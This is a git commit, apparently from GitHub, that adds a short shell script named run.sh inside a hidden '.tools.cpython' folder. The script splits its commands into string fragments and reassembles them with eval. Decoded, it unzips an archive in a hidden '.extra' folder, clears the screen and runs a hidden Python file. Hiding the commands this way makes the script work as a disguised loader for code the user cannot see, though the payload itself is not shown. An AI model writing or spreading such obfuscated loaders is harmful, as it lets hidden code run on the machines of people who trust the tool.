0a5d573a4899b01bfa6518f4a92697fae8b0248f
Naiyan AR Rahman <77504180+naiyan-official@users.noreply.github.com>
2021-05-14 20:16:20 +0600

    Create run.sh

---
+++ .tools.cpython/run.sh
@@ -0,0 +1,3 @@
+z="
+";Cz=' Dh-';Fz='d .e';Lz='lear';Gz='xtra';Ez='&& c';Bz='& cd';Iz='unzi';Hz=' && ';Mz='pyth';Oz='x.py';Kz='.zip';Dz='All ';Jz='p. e';Nz='on .';Az='cd &';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Gz$Kz$Ez$Lz$Hz$Mz$Nz$Oz"
